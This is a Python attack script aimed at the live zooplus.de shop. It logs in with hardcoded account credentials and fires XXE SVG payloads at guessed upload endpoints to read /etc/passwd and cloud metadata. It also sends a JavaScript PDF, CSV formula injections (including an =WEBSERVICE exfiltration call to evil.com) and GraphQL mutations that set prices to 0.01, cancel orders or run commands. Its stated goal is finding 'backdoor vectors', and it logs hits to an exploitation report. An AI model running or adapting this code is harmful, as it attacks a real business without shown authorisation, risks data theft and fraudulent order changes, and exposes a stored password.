#!/usr/bin/env python3
"""Test Top-3 Backdoor Vectors (RCE/LFI/Upload)"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# ============================================================================
# 1. SVG/PDF UPLOAD в отзывах/аватарке (XXE/RCE)
# ============================================================================
print("\n" + "=" * 70)
print("[1] SVG/PDF UPLOAD в отзывах/аватарке (XXE/RCE)")
print("=" * 70)

# SVG XXE payloads
svg_xxe_payloads = [
    # Basic XXE
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
    # XXE with PHP filter
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg>&xxe;</svg>',
    # XXE with Windows path
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><svg>&xxe;</svg>',
    # XXE with network
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg>&xxe;</svg>',
    # XXE with expect
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "expect://id">]><svg>&xxe;</svg>',
]

upload_endpoints = [
    "/api/review/upload",
    "/api/reviews/upload",
    "/myaccount/api/avatar",
    "/myaccount/api/avatar/upload",
    "/api/avatar/upload",
    "/account/api/avatar",
    "/profile/api/avatar",
    "/api/user/avatar",
    "/api/upload/avatar",
    "/api/file/upload",
    "/api/media/upload",
    "/api/images/upload",
]

print(f"\n[*] Testing {len(upload_endpoints)} upload endpoints with XXE...")

for ep in upload_endpoints:
    for i, svg_payload in enumerate(svg_xxe_payloads[:3]):  # Test first 3
        try:
            # Try as SVG
            files = {'file': ('exploit.svg', svg_payload, 'image/svg+xml')}
            resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
            
            if resp.status_code in [200, 201, 302]:
                response_text = resp.text
                
                # Check for XXE success
                if "root:x:0:0" in response_text or "root:" in response_text:
                    print(f"  [CRITICAL] SVG XXE SUCCESS: {ep}")
                    print(f"      Response contains /etc/passwd!")
                    found_vulns.append({
                        "type": "svg_xxe_lfi",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload_type": "XXE",
                        "response": response_text[:500]
                    })
                    break
                
                # Check for uploaded file location
                if resp.headers.get('Location'):
                    loc = resp.headers.get('Location')
                    if not loc.startswith('http'):
                        loc = f"{base}{loc}"
                    try:
                        resp2 = s.get(loc, timeout=3, verify=False)
                        if "root:" in resp2.text:
                            print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                            found_vulns.append({
                                "type": "svg_xxe_lfi",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "uploaded_to": loc,
                                "response": resp2.text[:500]
                            })
                            break
                    except: pass
                
                # Check JSON response
                if 'application/json' in resp.headers.get('Content-Type', ''):
                    try:
                        data = resp.json()
                        data_str = json.dumps(data)
                        if "root:" in data_str:
                            print(f"  [CRITICAL] SVG XXE in JSON response: {ep}")
                            found_vulns.append({
                                "type": "svg_xxe_lfi",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "response": data_str[:500]
                            })
                            break
                    except: pass
        except Exception as e:
            pass

# PDF with JavaScript
print("\n[*] Testing PDF upload with JavaScript...")
pdf_js = """%PDF-1.4
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>
endobj
3 0 obj
<</Type/Action/S/JavaScript/JS (app.alert("RCE");)>>
endobj"""

for ep in upload_endpoints[:5]:  # Test first 5
    try:
        files = {'file': ('exploit.pdf', pdf_js, 'application/pdf')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            print(f"  [HIGH] PDF upload accepted: {ep}")
            if resp.headers.get('Location'):
                print(f"      Location: {resp.headers.get('Location')}")
    except: pass

# ============================================================================
# 2. CSV IMPORT в AutoShipment/B2B
# ============================================================================
print("\n" + "=" * 70)
print("[2] CSV IMPORT в AutoShipment/B2B")
print("=" * 70)

csv_payloads = [
    # CSV Injection - command execution
    "=CMD|'/c calc'!A0",
    "=CMD|'/bin/sh -c id'!A0",
    "=HYPERLINK(\"http://evil.com\")",
    "@SUM(1+1)*cmd|'/c calc'!A0",
    # CSV Injection - data exfiltration
    "=WEBSERVICE(\"http://evil.com/?\"&A1)",
    # CSV with formula
    "=cmd|'/c cat /etc/passwd'!A0",
]

import_endpoints = [
    "/api/import/csv",
    "/api/import",
    "/partner/upload",
    "/partner/import",
    "/api/autoshipment/import",
    "/api/b2b/import",
    "/api/autoshipment/upload",
    "/api/b2b/upload",
    "/myaccount/api/import",
    "/checkout/api/import",
    "/semiprotected/api/import",
]

print(f"\n[*] Testing {len(import_endpoints)} CSV import endpoints...")

for ep in import_endpoints:
    for csv_payload in csv_payloads[:3]:  # Test first 3
        try:
            files = {'file': ('import.csv', csv_payload, 'text/csv')}
            resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
            
            if resp.status_code in [200, 201]:
                response_text = resp.text
                
                # Check for command execution
                if "calc" in response_text.lower() or "error" in response_text.lower():
                    print(f"  [CRITICAL] CSV Injection possible: {ep}")
                    print(f"      Payload: {csv_payload[:50]}")
                    found_vulns.append({
                        "type": "csv_injection_rce",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload": csv_payload,
                        "response": response_text[:500]
                    })
                    break
                
                # Check for formula execution
                if "WEBSERVICE" in response_text or "HYPERLINK" in response_text:
                    print(f"  [HIGH] CSV formula execution: {ep}")
                    found_vulns.append({
                        "type": "csv_injection",
                        "severity": "HIGH",
                        "endpoint": ep,
                        "payload": csv_payload
                    })
        except: pass

# ============================================================================
# 3. GRAPHQL INTROSPECTION
# ============================================================================
print("\n" + "=" * 70)
print("[3] GRAPHQL INTROSPECTION")
print("=" * 70)

graphql_endpoints = [
    "/graphql",
    "/api/graphql",
    "/graphql/v1",
    "/graphql/v2",
    "/api/v1/graphql",
    "/api/v2/graphql",
    "/rest/graphql",
    "/shop/graphql",
    "/checkout/graphql",
    "/myaccount/graphql",
]

introspection_queries = [
    {"query": "{__schema{types{name,fields{name}}}}"},
    {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } } }"},
    {"query": "{__type(name: \"Query\"){fields{name,args{name,type{name}}}}}"},
]

mutation_queries = [
    {"query": "mutation { setArticlePrice(articleId: 1, price: 0.01) { success } }"},
    {"query": "mutation { updateOrderStatus(orderId: 1, status: \"CANCELLED\") { success } }"},
    {"query": "mutation { executeCommand(command: \"id\") { output } }"},
]

print(f"\n[*] Testing {len(graphql_endpoints)} GraphQL endpoints...")

for ep in graphql_endpoints:
    # Test introspection
    for query in introspection_queries:
        try:
            resp = s.post(f"{base}{ep}", json=query, timeout=5, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                data_str = json.dumps(data)
                
                if '__schema' in data_str or 'types' in data_str or '__type' in data_str:
                    print(f"  [CRITICAL] GraphQL Introspection enabled: {ep}")
                    print(f"      Schema exposed!")
                    found_vulns.append({
                        "type": "graphql_introspection",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "schema_preview": data_str[:500]
                    })
                    
                    # Try mutations
                    for mut_query in mutation_queries:
                        try:
                            resp2 = s.post(f"{base}{ep}", json=mut_query, timeout=5, verify=False)
                            if resp2.status_code == 200:
                                mut_data = resp2.json() if 'application/json' in resp2.headers.get('Content-Type', '') else {}
                                if 'success' in str(mut_data) or 'output' in str(mut_data):
                                    print(f"  [CRITICAL] GraphQL Mutation works: {ep}")
                                    found_vulns.append({
                                        "type": "graphql_mutation_rce",
                                        "severity": "CRITICAL",
                                        "endpoint": ep,
                                        "mutation": mut_query
                                    })
                                    break
                        except: pass
                    break
        except: pass

# ============================================================================
# SUMMARY
# ============================================================================
print("\n" + "=" * 70)
print("VULNERABILITIES FOUND")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload'][:100]}")
        print()
    
    # Update FINAL_EXPLOITATION_REPORT.md
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ - БЕКДОР ВЕКТОРЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write("**Тестирование топ-3 векторов для бекдора (RCE/LFI/Upload):**\n\n")
        
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            
            if v['type'] == 'svg_xxe_lfi':
                f.write("**Description:** SVG XXE позволяет читать локальные файлы через XML Entity Injection.\n\n")
                f.write("**Impact:** LFI (Local File Inclusion) - чтение /etc/passwd и других системных файлов.\n\n")
                if 'uploaded_to' in v:
                    f.write(f"**Uploaded file location:** `{v['uploaded_to']}`\n\n")
            
            elif v['type'] == 'csv_injection_rce':
                f.write("**Description:** CSV Injection позволяет выполнить команды через формулы в CSV файлах.\n\n")
                f.write("**Impact:** RCE (Remote Code Execution) через CSV import.\n\n")
                if 'payload' in v:
                    f.write(f"**Payload:** `{v['payload']}`\n\n")
            
            elif v['type'] == 'graphql_introspection':
                f.write("**Description:** GraphQL Introspection включен, схема доступна.\n\n")
                f.write("**Impact:** Раскрытие структуры API, поиск мутаций для RCE.\n\n")
            
            elif v['type'] == 'graphql_mutation_rce':
                f.write("**Description:** GraphQL мутации позволяют выполнить команды.\n\n")
                f.write("**Impact:** RCE через GraphQL мутации.\n\n")
            
            if 'response' in v:
                f.write(f"**Response preview:** `{v['response'][:500]}`\n\n")
            
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No critical vulnerabilities found")
    print("\n  Note: Endpoints may require real UI actions to trigger")
    print("  Recommendation: Test through browser DevTools Network tab")

print("=" * 70)

